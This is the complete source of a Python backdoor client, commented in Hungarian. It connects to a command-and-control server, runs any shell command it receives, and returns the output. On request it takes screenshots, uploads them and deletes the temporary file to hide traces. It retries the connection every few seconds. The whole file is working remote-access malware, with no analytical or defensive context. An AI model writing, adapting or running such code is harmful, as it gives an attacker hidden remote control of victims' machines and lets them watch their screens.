import socket
import subprocess
import os
import threading
import pyautogui # PIP INSTALL KELL!
import tempfile

SERVER_IP = "127.0.0.1"
SERVER_PORT = 9999

def send_file(sock, filepath):
    """Fájl küldése a szervernek."""
    try:
        if os.path.exists(filepath):
            file_size = os.path.getsize(filepath)
            # 1. Elküldjük a méretet
            sock.send(str(file_size).encode())
            
            # Várjuk a szerver visszajelzését (ACK)
            sock.recv(1024)
            
            # 2. Elküldjük az adatot
            with open(filepath, "rb") as f:
                while True:
                    chunk = f.read(4096)
                    if not chunk: break
                    sock.send(chunk)
    except Exception as e:
        sock.send(f"Hiba a küldésnél: {e}".encode())

def connect_to_c2():
    while True: # Újracsatlakozási logika, ha megszakadna
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((SERVER_IP, SERVER_PORT))
            
            while True:
                command = s.recv(1024).decode()
                
                if command == "exit":
                    s.close()
                    return

                # --- SCREENSHOT LOGIKA ---
                if command == "screenshot":
                    # Kép készítése egy ideiglenes fájlba
                    tmp_filename = os.path.join(tempfile.gettempdir(), "screen_capture.png")
                    screenshot = pyautogui.screenshot()
                    screenshot.save(tmp_filename)
                    
                    # Fájl elküldése
                    send_file(s, tmp_filename)
                    
                    # Takarítás (nyomok eltüntetése)
                    try:
                        os.remove(tmp_filename)
                    except: pass
                
                # --- SIMA PARANCSOK ---
                else:
                    cmd_res = subprocess.run(command, shell=True, capture_output=True)
                    output = cmd_res.stdout + cmd_res.stderr
                    if not output: output = b"[OK] Done."
                    s.send(output)
        except:
            # Ha nem sikerül kapcsolódni, vár 5 másodpercet és újrapróbálja
            import time
            time.sleep(5)

def run_backdoor():
    t = threading.Thread(target=connect_to_c2)
    t.daemon = True
    t.start()

# Teszteléshez közvetlenül is futtatható
if __name__ == "__main__":
    run_backdoor()